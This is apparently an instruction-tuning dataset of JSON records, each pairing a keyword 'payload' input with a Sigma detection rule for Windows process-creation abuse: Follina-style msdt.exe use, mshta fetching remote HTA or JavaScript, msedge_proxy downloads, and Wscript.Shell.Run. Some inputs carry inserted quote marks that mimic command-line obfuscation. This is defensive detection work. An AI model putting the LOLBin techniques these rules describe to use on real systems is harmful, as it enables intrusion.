{"instruction": "Write Sigma rule to detect payload:", "input": "\\msdt.exe msdt.exe -cab", "output": "title: Suspicious Cabinet File Execution Via Msdt.EXE\nid: dc4576d4-7467-424f-9eee-fd2b02855fe0\nrelated:\n    - id: 6545ce61-a1bd-4119-b9be-fcbee42c0cf3\n      type: obsolete\nstatus: test\ndescription: Detects execution of msdt.exe using the \"cab\" flag which could indicates suspicious diagcab files with embedded answer files leveraging CVE-2022-30190\nreferences:\n    - https://twitter.com/nas_bench/status/1537896324837781506\n    - https://github.com/GossiTheDog/ThreatHunting/blob/e85884abbf05d5b41efc809ea6532b10b45bd05c/AdvancedHuntingQueries/DogWalk-DiagCab\n    - https://github.com/elastic/protections-artifacts/commit/746086721fd385d9f5c6647cada1788db4aea95f#diff-9015912909545e72ed42cbac4d1e96295e8964579c406d23fd9c47a8091576a0\n    - https://irsl.medium.com/the-trouble-with-microsofts-troubleshooters-6e32fc80b8bd\nauthor: Nasreddine Bencherchali (Nextron Systems), GossiTheDog, frack113\ndate: 2022-06-21\nmodified: 2024-03-13\ntags:\n    - attack.defense-evasion\n    - attack.t1202\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - Image|endswith: '\\msdt.exe'\n        - OriginalFileName: 'msdt.exe'\n    selection_cmd:\n        CommandLine|contains|windash: ' -cab '\n    condition: all of selection_*\nfalsepositives:\n    - Legitimate usage of \".diagcab\" files\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\cmd.exe \\cscript.exe \\mshta.exe \\powershell.exe \\pwsh.exe \\regsvr32.exe \\rundll32.exe \\schtasks.exe \\wmic.exe \\wscript.exe \\wsl.exe \\msdt.exe msdt.exe", "output": "title: Suspicious MSDT Parent Process\nid: 7a74da6b-ea76-47db-92cc-874ad90df734\nstatus: test\ndescription: Detects msdt.exe executed by a suspicious parent as seen in CVE-2022-30190 / Follina exploitation\nreferences:\n    - https://twitter.com/nao_sec/status/1530196847679401984\n    - https://app.any.run/tasks/713f05d2-fe78-4b9d-a744-f7c133e3fafb/\nauthor: Nextron Systems\ndate: 2022-06-01\nmodified: 2023-02-06\ntags:\n    - attack.defense-evasion\n    - attack.t1036\n    - attack.t1218\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_parent:\n        ParentImage|endswith:\n            - '\\cmd.exe'\n            - '\\cscript.exe'\n            - '\\mshta.exe'\n            - '\\powershell.exe'\n            - '\\pwsh.exe'\n            - '\\regsvr32.exe'\n            - '\\rundll32.exe'\n            - '\\schtasks.exe'\n            - '\\wmic.exe'\n            - '\\wscript.exe'\n            - '\\wsl.exe'\n            # Note: office applications are covered by: 438025f9-5856-4663-83f7-52f878a70a50\n    selection_msdt:\n        - Image|endswith: '\\msdt.exe'\n        - OriginalFileName: 'msdt.exe'\n    condition: all of selection_*\nfalsepositives:\n    - Unknown\nlevel: high"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\cmd.exe \\cscript.exe \\mshta.exe \\powershell.exe \\pwsh.exe \\regsvr32.exe \\rundll32.exe \\schta\"sks.exe\" \\wmic.exe \\wscript.exe \\wsl.exe \\msdt.exe msdt.exe", "output": "title: Suspicious MSDT Parent Process\nid: 7a74da6b-ea76-47db-92cc-874ad90df734\nstatus: test\ndescription: Detects msdt.exe executed by a suspicious parent as seen in CVE-2022-30190 / Follina exploitation\nreferences:\n    - https://twitter.com/nao_sec/status/1530196847679401984\n    - https://app.any.run/tasks/713f05d2-fe78-4b9d-a744-f7c133e3fafb/\nauthor: Nextron Systems\ndate: 2022-06-01\nmodified: 2023-02-06\ntags:\n    - attack.defense-evasion\n    - attack.t1036\n    - attack.t1218\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_parent:\n        ParentImage|endswith:\n            - '\\cmd.exe'\n            - '\\cscript.exe'\n            - '\\mshta.exe'\n            - '\\powershell.exe'\n            - '\\pwsh.exe'\n            - '\\regsvr32.exe'\n            - '\\rundll32.exe'\n            - '\\schtasks.exe'\n            - '\\wmic.exe'\n            - '\\wscript.exe'\n            - '\\wsl.exe'\n            # Note: office applications are covered by: 438025f9-5856-4663-83f7-52f878a70a50\n    selection_msdt:\n        - Image|endswith: '\\msdt.exe'\n        - OriginalFileName: 'msdt.exe'\n    condition: all of selection_*\nfalsepositives:\n    - Unknown\nlevel: high"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\cmd \\cscript \\mshta \\powershell \\pwsh \\regsvr32 \\rundll32 \\schtasks \\wmic \\wscript \\wsl \\msdt msdt", "output": "title: Suspicious MSDT Parent Process\nid: 7a74da6b-ea76-47db-92cc-874ad90df734\nstatus: test\ndescription: Detects msdt.exe executed by a suspicious parent as seen in CVE-2022-30190 / Follina exploitation\nreferences:\n    - https://twitter.com/nao_sec/status/1530196847679401984\n    - https://app.any.run/tasks/713f05d2-fe78-4b9d-a744-f7c133e3fafb/\nauthor: Nextron Systems\ndate: 2022-06-01\nmodified: 2023-02-06\ntags:\n    - attack.defense-evasion\n    - attack.t1036\n    - attack.t1218\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_parent:\n        ParentImage|endswith:\n            - '\\cmd.exe'\n            - '\\cscript.exe'\n            - '\\mshta.exe'\n            - '\\powershell.exe'\n            - '\\pwsh.exe'\n            - '\\regsvr32.exe'\n            - '\\rundll32.exe'\n            - '\\schtasks.exe'\n            - '\\wmic.exe'\n            - '\\wscript.exe'\n            - '\\wsl.exe'\n            # Note: office applications are covered by: 438025f9-5856-4663-83f7-52f878a70a50\n    selection_msdt:\n        - Image|endswith: '\\msdt.exe'\n        - OriginalFileName: 'msdt.exe'\n    condition: all of selection_*\nfalsepositives:\n    - Unknown\nlevel: high"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\cmd.exe \\cscript.exe \\mshta.exe \\powershell.exe \\pwsh.exe \\regsvr32.exe \\rundll32.exe \\schtasks.exe \\wmic.exe \\wscript.exe \\wsl.exe \\msdt.exe msdt.exe", "output": "title: Suspicious MSDT Parent Process\nid: 7a74da6b-ea76-47db-92cc-874ad90df734\nstatus: test\ndescription: Detects msdt.exe executed by a suspicious parent as seen in CVE-2022-30190 / Follina exploitation\nreferences:\n    - https://twitter.com/nao_sec/status/1530196847679401984\n    - https://app.any.run/tasks/713f05d2-fe78-4b9d-a744-f7c133e3fafb/\nauthor: Nextron Systems\ndate: 2022-06-01\nmodified: 2023-02-06\ntags:\n    - attack.defense-evasion\n    - attack.t1036\n    - attack.t1218\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_parent:\n        ParentImage|endswith:\n            - '\\cmd.exe'\n            - '\\cscript.exe'\n            - '\\mshta.exe'\n            - '\\powershell.exe'\n            - '\\pwsh.exe'\n            - '\\regsvr32.exe'\n            - '\\rundll32.exe'\n            - '\\schtasks.exe'\n            - '\\wmic.exe'\n            - '\\wscript.exe'\n            - '\\wsl.exe'\n            # Note: office applications are covered by: 438025f9-5856-4663-83f7-52f878a70a50\n    selection_msdt:\n        - Image|endswith: '\\msdt.exe'\n        - OriginalFileName: 'msdt.exe'\n    condition: all of selection_*\nfalsepositives:\n    - Unknown\nlevel: high"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\msedge_proxy.exe msedge_proxy.exe http:// https://", "output": "title: Arbitrary File Download Via MSEDGE_PROXY.EXE\nid: e84d89c4-f544-41ca-a6af-4b92fd38b023\nstatus: test\ndescription: Detects usage of \"msedge_proxy.exe\" to download arbitrary files\nreferences:\n    - https://lolbas-project.github.io/lolbas/Binaries/msedge_proxy/\nauthor: Swachchhanda Shrawan Poudel\ndate: 2023-11-09\ntags:\n    - attack.defense-evasion\n    - attack.execution\n    - attack.t1218\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - Image|endswith: '\\msedge_proxy.exe'\n        - OriginalFileName: 'msedge_proxy.exe'\n    selection_cli:\n        CommandLine|contains:\n            - 'http://'\n            - 'https://'\n    condition: all of selection_*\nfalsepositives:\n    - Unknown\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\msedge_proxy.exe \\\"m\\\"\\\"s\\\"\\\"e\\\"\\\"d\\\"\\\"g\\\"\\\"e\\\"\\\"_\\\"\\\"p\\\"\\\"r\\\"\\\"o\\\"\\\"x\\\"\\\"y\\\"\\\".\\\"\\\"e\\\"\\\"x\\\"\\\"e\\\" http:// https://", "output": "title: Arbitrary File Download Via MSEDGE_PROXY.EXE\nid: e84d89c4-f544-41ca-a6af-4b92fd38b023\nstatus: test\ndescription: Detects usage of \"msedge_proxy.exe\" to download arbitrary files\nreferences:\n    - https://lolbas-project.github.io/lolbas/Binaries/msedge_proxy/\nauthor: Swachchhanda Shrawan Poudel\ndate: 2023-11-09\ntags:\n    - attack.defense-evasion\n    - attack.execution\n    - attack.t1218\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - Image|endswith: '\\msedge_proxy.exe'\n        - OriginalFileName: 'msedge_proxy.exe'\n    selection_cli:\n        CommandLine|contains:\n            - 'http://'\n            - 'https://'\n    condition: all of selection_*\nfalsepositives:\n    - Unknown\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\msedge_proxy msedge_proxy http:// https://", "output": "title: Arbitrary File Download Via MSEDGE_PROXY.EXE\nid: e84d89c4-f544-41ca-a6af-4b92fd38b023\nstatus: test\ndescription: Detects usage of \"msedge_proxy.exe\" to download arbitrary files\nreferences:\n    - https://lolbas-project.github.io/lolbas/Binaries/msedge_proxy/\nauthor: Swachchhanda Shrawan Poudel\ndate: 2023-11-09\ntags:\n    - attack.defense-evasion\n    - attack.execution\n    - attack.t1218\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - Image|endswith: '\\msedge_proxy.exe'\n        - OriginalFileName: 'msedge_proxy.exe'\n    selection_cli:\n        CommandLine|contains:\n            - 'http://'\n            - 'https://'\n    condition: all of selection_*\nfalsepositives:\n    - Unknown\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\msedge_proxy.exe https:// msedge_proxy.exe http://", "output": "title: Arbitrary File Download Via MSEDGE_PROXY.EXE\nid: e84d89c4-f544-41ca-a6af-4b92fd38b023\nstatus: test\ndescription: Detects usage of \"msedge_proxy.exe\" to download arbitrary files\nreferences:\n    - https://lolbas-project.github.io/lolbas/Binaries/msedge_proxy/\nauthor: Swachchhanda Shrawan Poudel\ndate: 2023-11-09\ntags:\n    - attack.defense-evasion\n    - attack.execution\n    - attack.t1218\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - Image|endswith: '\\msedge_proxy.exe'\n        - OriginalFileName: 'msedge_proxy.exe'\n    selection_cli:\n        CommandLine|contains:\n            - 'http://'\n            - 'https://'\n    condition: all of selection_*\nfalsepositives:\n    - Unknown\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\mshta.exe MSHTA.EXE http:// https:// ftp://", "output": "title: Remotely Hosted HTA File Executed Via Mshta.EXE\nid: b98d0db6-511d-45de-ad02-e82a98729620\nstatus: test\ndescription: Detects execution of the \"mshta\" utility with an argument containing the \"http\" keyword, which could indicate that an attacker is executing a remotely hosted malicious hta file\nreferences:\n    - https://www.trendmicro.com/en_us/research/22/e/avoslocker-ransomware-variant-abuses-driver-file-to-disable-anti-Virus-scans-log4shell.html\nauthor: Nasreddine Bencherchali (Nextron Systems)\ndate: 2022-08-08\nmodified: 2023-02-06\ntags:\n    - attack.defense-evasion\n    - attack.execution\n    - attack.t1218.005\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - Image|endswith: '\\mshta.exe'\n        - OriginalFileName: 'MSHTA.EXE'\n    selection_cli:\n        CommandLine|contains:\n            - 'http://'\n            - 'https://'\n            - 'ftp://'\n    condition: all of selection_*\nfalsepositives:\n    - Unknown\nlevel: high"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\mshta.exe \"MSHT\"A.EXE http:// https:// ftp://", "output": "title: Remotely Hosted HTA File Executed Via Mshta.EXE\nid: b98d0db6-511d-45de-ad02-e82a98729620\nstatus: test\ndescription: Detects execution of the \"mshta\" utility with an argument containing the \"http\" keyword, which could indicate that an attacker is executing a remotely hosted malicious hta file\nreferences:\n    - https://www.trendmicro.com/en_us/research/22/e/avoslocker-ransomware-variant-abuses-driver-file-to-disable-anti-Virus-scans-log4shell.html\nauthor: Nasreddine Bencherchali (Nextron Systems)\ndate: 2022-08-08\nmodified: 2023-02-06\ntags:\n    - attack.defense-evasion\n    - attack.execution\n    - attack.t1218.005\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - Image|endswith: '\\mshta.exe'\n        - OriginalFileName: 'MSHTA.EXE'\n    selection_cli:\n        CommandLine|contains:\n            - 'http://'\n            - 'https://'\n            - 'ftp://'\n    condition: all of selection_*\nfalsepositives:\n    - Unknown\nlevel: high"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\mshta MSHTA http:// https:// ftp://", "output": "title: Remotely Hosted HTA File Executed Via Mshta.EXE\nid: b98d0db6-511d-45de-ad02-e82a98729620\nstatus: test\ndescription: Detects execution of the \"mshta\" utility with an argument containing the \"http\" keyword, which could indicate that an attacker is executing a remotely hosted malicious hta file\nreferences:\n    - https://www.trendmicro.com/en_us/research/22/e/avoslocker-ransomware-variant-abuses-driver-file-to-disable-anti-Virus-scans-log4shell.html\nauthor: Nasreddine Bencherchali (Nextron Systems)\ndate: 2022-08-08\nmodified: 2023-02-06\ntags:\n    - attack.defense-evasion\n    - attack.execution\n    - attack.t1218.005\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - Image|endswith: '\\mshta.exe'\n        - OriginalFileName: 'MSHTA.EXE'\n    selection_cli:\n        CommandLine|contains:\n            - 'http://'\n            - 'https://'\n            - 'ftp://'\n    condition: all of selection_*\nfalsepositives:\n    - Unknown\nlevel: high"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\mshta.exe ftp:// http:// https:// MSHTA.EXE", "output": "title: Remotely Hosted HTA File Executed Via Mshta.EXE\nid: b98d0db6-511d-45de-ad02-e82a98729620\nstatus: test\ndescription: Detects execution of the \"mshta\" utility with an argument containing the \"http\" keyword, which could indicate that an attacker is executing a remotely hosted malicious hta file\nreferences:\n    - https://www.trendmicro.com/en_us/research/22/e/avoslocker-ransomware-variant-abuses-driver-file-to-disable-anti-Virus-scans-log4shell.html\nauthor: Nasreddine Bencherchali (Nextron Systems)\ndate: 2022-08-08\nmodified: 2023-02-06\ntags:\n    - attack.defense-evasion\n    - attack.execution\n    - attack.t1218.005\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - Image|endswith: '\\mshta.exe'\n        - OriginalFileName: 'MSHTA.EXE'\n    selection_cli:\n        CommandLine|contains:\n            - 'http://'\n            - 'https://'\n            - 'ftp://'\n    condition: all of selection_*\nfalsepositives:\n    - Unknown\nlevel: high"}
{"instruction": "Write Sigma rule to detect payload:", "input": "Wscript. .Shell .Run", "output": "title: Wscript Shell Run In CommandLine\nid: 2c28c248-7f50-417a-9186-a85b223010ee\nstatus: test\ndescription: Detects the presence of the keywords \"Wscript\", \"Shell\" and \"Run\" in the command, which could indicate a suspicious activity\nreferences:\n    - https://web.archive.org/web/20220830122045/http://blog.talosintelligence.com/2022/08/modernloader-delivers-multiple-stealers.html\n    - https://blog.talosintelligence.com/modernloader-delivers-multiple-stealers-cryptominers-and-rats/\nauthor: Nasreddine Bencherchali (Nextron Systems)\ndate: 2022-08-31\nmodified: 2023-05-15\ntags:\n    - attack.execution\n    - attack.t1059\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        CommandLine|contains|all:\n            - 'Wscript.'\n            - '.Shell'\n            - '.Run'\n    condition: selection\nfalsepositives:\n    - Inline scripting can be used by some rare third party applications or administrators. Investigate and apply additional filters accordingly\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "Wscript. .Shell .R\\\"un\\\"", "output": "title: Wscript Shell Run In CommandLine\nid: 2c28c248-7f50-417a-9186-a85b223010ee\nstatus: test\ndescription: Detects the presence of the keywords \"Wscript\", \"Shell\" and \"Run\" in the command, which could indicate a suspicious activity\nreferences:\n    - https://web.archive.org/web/20220830122045/http://blog.talosintelligence.com/2022/08/modernloader-delivers-multiple-stealers.html\n    - https://blog.talosintelligence.com/modernloader-delivers-multiple-stealers-cryptominers-and-rats/\nauthor: Nasreddine Bencherchali (Nextron Systems)\ndate: 2022-08-31\nmodified: 2023-05-15\ntags:\n    - attack.execution\n    - attack.t1059\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        CommandLine|contains|all:\n            - 'Wscript.'\n            - '.Shell'\n            - '.Run'\n    condition: selection\nfalsepositives:\n    - Inline scripting can be used by some rare third party applications or administrators. Investigate and apply additional filters accordingly\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "Wscript. .Run .Shell", "output": "title: Wscript Shell Run In CommandLine\nid: 2c28c248-7f50-417a-9186-a85b223010ee\nstatus: test\ndescription: Detects the presence of the keywords \"Wscript\", \"Shell\" and \"Run\" in the command, which could indicate a suspicious activity\nreferences:\n    - https://web.archive.org/web/20220830122045/http://blog.talosintelligence.com/2022/08/modernloader-delivers-multiple-stealers.html\n    - https://blog.talosintelligence.com/modernloader-delivers-multiple-stealers-cryptominers-and-rats/\nauthor: Nasreddine Bencherchali (Nextron Systems)\ndate: 2022-08-31\nmodified: 2023-05-15\ntags:\n    - attack.execution\n    - attack.t1059\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        CommandLine|contains|all:\n            - 'Wscript.'\n            - '.Shell'\n            - '.Run'\n    condition: selection\nfalsepositives:\n    - Inline scripting can be used by some rare third party applications or administrators. Investigate and apply additional filters accordingly\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\mshta.exe MSHTA.EXE javascript", "output": "title: Suspicious JavaScript Execution Via Mshta.EXE\nid: 67f113fa-e23d-4271-befa-30113b3e08b1\nstatus: test\ndescription: Detects execution of javascript code using \"mshta.exe\".\nreferences:\n    - https://eqllib.readthedocs.io/en/latest/analytics/6bc283c4-21f2-4aed-a05c-a9a3ffa95dd4.html\n    - https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1218.005/T1218.005.md\nauthor: E.M. Anhaus (originally from Atomic Blue Detections, Endgame), oscd.community\ndate: 2019-10-24\nmodified: 2023-02-07\ntags:\n    - attack.defense-evasion\n    - attack.t1218.005\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - Image|endswith: '\\mshta.exe'\n        - OriginalFileName: 'MSHTA.EXE'\n    selection_cli:\n        CommandLine|contains: 'javascript'\n    condition: all of selection_*\nfalsepositives:\n    - Unknown\nlevel: high"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\mshta.exe MSHTA.EXE \"javascript\"", "output": "title: Suspicious JavaScript Execution Via Mshta.EXE\nid: 67f113fa-e23d-4271-befa-30113b3e08b1\nstatus: test\ndescription: Detects execution of javascript code using \"mshta.exe\".\nreferences:\n    - https://eqllib.readthedocs.io/en/latest/analytics/6bc283c4-21f2-4aed-a05c-a9a3ffa95dd4.html\n    - https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1218.005/T1218.005.md\nauthor: E.M. Anhaus (originally from Atomic Blue Detections, Endgame), oscd.community\ndate: 2019-10-24\nmodified: 2023-02-07\ntags:\n    - attack.defense-evasion\n    - attack.t1218.005\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - Image|endswith: '\\mshta.exe'\n        - OriginalFileName: 'MSHTA.EXE'\n    selection_cli:\n        CommandLine|contains: 'javascript'\n    condition: all of selection_*\nfalsepositives:\n    - Unknown\nlevel: high"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\mshta MSHTA javascript", "output": "title: Suspicious JavaScript Execution Via Mshta.EXE\nid: 67f113fa-e23d-4271-befa-30113b3e08b1\nstatus: test\ndescription: Detects execution of javascript code using \"mshta.exe\".\nreferences:\n    - https://eqllib.readthedocs.io/en/latest/analytics/6bc283c4-21f2-4aed-a05c-a9a3ffa95dd4.html\n    - https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1218.005/T1218.005.md\nauthor: E.M. Anhaus (originally from Atomic Blue Detections, Endgame), oscd.community\ndate: 2019-10-24\nmodified: 2023-02-07\ntags:\n    - attack.defense-evasion\n    - attack.t1218.005\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - Image|endswith: '\\mshta.exe'\n        - OriginalFileName: 'MSHTA.EXE'\n    selection_cli:\n        CommandLine|contains: 'javascript'\n    condition: all of selection_*\nfalsepositives:\n    - Unknown\nlevel: high"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\mshta.exe javascript MSHTA.EXE", "output": "title: Suspicious JavaScript Execution Via Mshta.EXE\nid: 67f113fa-e23d-4271-befa-30113b3e08b1\nstatus: test\ndescription: Detects execution of javascript code using \"mshta.exe\".\nreferences:\n    - https://eqllib.readthedocs.io/en/latest/analytics/6bc283c4-21f2-4aed-a05c-a9a3ffa95dd4.html\n    - https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1218.005/T1218.005.md\nauthor: E.M. Anhaus (originally from Atomic Blue Detections, Endgame), oscd.community\ndate: 2019-10-24\nmodified: 2023-02-07\ntags:\n    - attack.defense-evasion\n    - attack.t1218.005\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - Image|endswith: '\\mshta.exe'\n        - OriginalFileName: 'MSHTA.EXE'\n    selection_cli:\n        CommandLine|contains: 'javascript'\n    condition: all of selection_*\nfalsepositives:\n    - Unknown\nlevel: high"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\svchost.exe \\mshta.exe", "output": "title: Potential LethalHTA Technique Execution\nid: ed5d72a6-f8f4-479d-ba79-02f6a80d7471\nstatus: test\ndescription: Detects potential LethalHTA technique where the \"mshta.exe\" is spawned by an \"svchost.exe\" process\nreferences:\n    - https://codewhitesec.blogspot.com/2018/07/lethalhta.html\nauthor: Markus Neis\ndate: 2018-06-07\nmodified: 2023-02-07\ntags:\n    - attack.defense-evasion\n    - attack.t1218.005\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        ParentImage|endswith: '\\svchost.exe'\n        Image|endswith: '\\mshta.exe'\n    condition: selection\nfalsepositives:\n    - Unknown\nlevel: high"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\svchost.exe \\msht\\\"a.exe\\\"", "output": "title: Potential LethalHTA Technique Execution\nid: ed5d72a6-f8f4-479d-ba79-02f6a80d7471\nstatus: test\ndescription: Detects potential LethalHTA technique where the \"mshta.exe\" is spawned by an \"svchost.exe\" process\nreferences:\n    - https://codewhitesec.blogspot.com/2018/07/lethalhta.html\nauthor: Markus Neis\ndate: 2018-06-07\nmodified: 2023-02-07\ntags:\n    - attack.defense-evasion\n    - attack.t1218.005\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        ParentImage|endswith: '\\svchost.exe'\n        Image|endswith: '\\mshta.exe'\n    condition: selection\nfalsepositives:\n    - Unknown\nlevel: high"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\svchost \\mshta", "output": "title: Potential LethalHTA Technique Execution\nid: ed5d72a6-f8f4-479d-ba79-02f6a80d7471\nstatus: test\ndescription: Detects potential LethalHTA technique where the \"mshta.exe\" is spawned by an \"svchost.exe\" process\nreferences:\n    - https://codewhitesec.blogspot.com/2018/07/lethalhta.html\nauthor: Markus Neis\ndate: 2018-06-07\nmodified: 2023-02-07\ntags:\n    - attack.defense-evasion\n    - attack.t1218.005\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        ParentImage|endswith: '\\svchost.exe'\n        Image|endswith: '\\mshta.exe'\n    condition: selection\nfalsepositives:\n    - Unknown\nlevel: high"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\svchost.exe \\mshta.exe", "output": "title: Potential LethalHTA Technique Execution\nid: ed5d72a6-f8f4-479d-ba79-02f6a80d7471\nstatus: test\ndescription: Detects potential LethalHTA technique where the \"mshta.exe\" is spawned by an \"svchost.exe\" process\nreferences:\n    - https://codewhitesec.blogspot.com/2018/07/lethalhta.html\nauthor: Markus Neis\ndate: 2018-06-07\nmodified: 2023-02-07\ntags:\n    - attack.defense-evasion\n    - attack.t1218.005\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        ParentImage|endswith: '\\svchost.exe'\n        Image|endswith: '\\mshta.exe'\n    condition: selection\nfalsepositives:\n    - Unknown\nlevel: high"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\mshta.exe mshta.exe .7z .avi .bat .bmp .conf .csv .dll .doc .gif .gz .ini .jpe .jpg .json .lnk .log .mkv .mp3 .mp4 .pdf .png .ppt .rar .rtf .svg .tar .tmp .txt .xls .xml .yaml .yml .zip vbscript", "output": "title: MSHTA Execution with Suspicious File Extensions\nid: cc7abbd0-762b-41e3-8a26-57ad50d2eea3\nstatus: test\ndescription: |\n    Detects execution of mshta.exe with file types that looks like they do not typically represent HTA (HTML Application) content,\n    such as .png, .jpg, .zip, .pdf, and others, which are often polyglots. MSHTA is a legitimate Windows utility for executing HTML Applications\n    containing VBScript or JScript. Threat actors often abuse this lolbin utility to download and\n    execute malicious scripts disguised as benign files or hosted under misleading extensions to evade detection.\nreferences:\n    - http://blog.sevagas.com/?Hacking-around-HTA-files\n    - https://0x00sec.org/t/clientside-exploitation-in-2018-how-pentesting-has-changed/7356\n    - https://learn.microsoft.com/en-us/previous-versions/dotnet/framework/data/xml/xslt/xslt-stylesheet-scripting-using-msxsl-script\n    - https://medium.com/tsscyber/pentesting-and-hta-bypassing-powershell-constrained-language-mode-53a42856c997\n    - https://twitter.com/mattifestation/status/1326228491302563846\n    - https://www.virustotal.com/gui/file/c1f27d9795a2eba630db8a043580a0761798f06370fb1317067805f8a845b00c\nauthor: Diego Perez (@darkquassar), Markus Neis, Swisscom (Improve Rule), Swachchhanda Shrawan Poudel (Nextron Systems)\ndate: 2019-02-22\nmodified: 2025-05-12\ntags:\n    - attack.defense-evasion\n    - attack.t1140\n    - attack.t1218.005\n    - attack.execution\n    - attack.t1059.007\n    - cve.2020-1599\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - Image|endswith: '\\mshta.exe'\n        - OriginalFileName: 'mshta.exe'\n    selection_cli:\n        CommandLine|contains:\n            - '.7z'\n            - '.avi'\n            - '.bat'\n            - '.bmp'\n            - '.conf'\n            - '.csv'\n            - '.dll'\n            - '.doc'\n            - '.gif'\n            - '.gz'\n            - '.ini'\n            - '.jpe'\n            - '.jpg'\n            - '.json'\n            - '.lnk'\n            - '.log'\n            - '.mkv'\n            - '.mp3'\n            - '.mp4'\n            - '.pdf'\n            - '.png'\n            - '.ppt'\n            - '.rar'\n            - '.rtf'\n            - '.svg'\n            - '.tar'\n            - '.tmp'\n            - '.txt'\n            - '.xls'\n            - '.xml'\n            - '.yaml'\n            - '.yml'\n            - '.zip'\n            - 'vbscript'\n            # - '.chm'  # could be prone to false positives\n            # - '.exe'\n    condition: all of selection_*\nfalsepositives:\n    - False positives depend on scripts and administrative tools used in the monitored environment\nlevel: high"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\mshta.exe mshta.exe .7z .avi .bat .bmp .conf .csv .dll .doc .gif .gz .ini .jpe .jpg .json .lnk .log .mkv .mp3 .mp4 .pdf .png .ppt .rar .rtf .svg .tar \\\".tmp\\\" .txt .xls .xml .yaml .yml .zip vbscript", "output": "title: MSHTA Execution with Suspicious File Extensions\nid: cc7abbd0-762b-41e3-8a26-57ad50d2eea3\nstatus: test\ndescription: |\n    Detects execution of mshta.exe with file types that looks like they do not typically represent HTA (HTML Application) content,\n    such as .png, .jpg, .zip, .pdf, and others, which are often polyglots. MSHTA is a legitimate Windows utility for executing HTML Applications\n    containing VBScript or JScript. Threat actors often abuse this lolbin utility to download and\n    execute malicious scripts disguised as benign files or hosted under misleading extensions to evade detection.\nreferences:\n    - http://blog.sevagas.com/?Hacking-around-HTA-files\n    - https://0x00sec.org/t/clientside-exploitation-in-2018-how-pentesting-has-changed/7356\n    - https://learn.microsoft.com/en-us/previous-versions/dotnet/framework/data/xml/xslt/xslt-stylesheet-scripting-using-msxsl-script\n    - https://medium.com/tsscyber/pentesting-and-hta-bypassing-powershell-constrained-language-mode-53a42856c997\n    - https://twitter.com/mattifestation/status/1326228491302563846\n    - https://www.virustotal.com/gui/file/c1f27d9795a2eba630db8a043580a0761798f06370fb1317067805f8a845b00c\nauthor: Diego Perez (@darkquassar), Markus Neis, Swisscom (Improve Rule), Swachchhanda Shrawan Poudel (Nextron Systems)\ndate: 2019-02-22\nmodified: 2025-05-12\ntags:\n    - attack.defense-evasion\n    - attack.t1140\n    - attack.t1218.005\n    - attack.execution\n    - attack.t1059.007\n    - cve.2020-1599\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - Image|endswith: '\\mshta.exe'\n        - OriginalFileName: 'mshta.exe'\n    selection_cli:\n        CommandLine|contains:\n            - '.7z'\n            - '.avi'\n            - '.bat'\n            - '.bmp'\n            - '.conf'\n            - '.csv'\n            - '.dll'\n            - '.doc'\n            - '.gif'\n            - '.gz'\n            - '.ini'\n            - '.jpe'\n            - '.jpg'\n            - '.json'\n     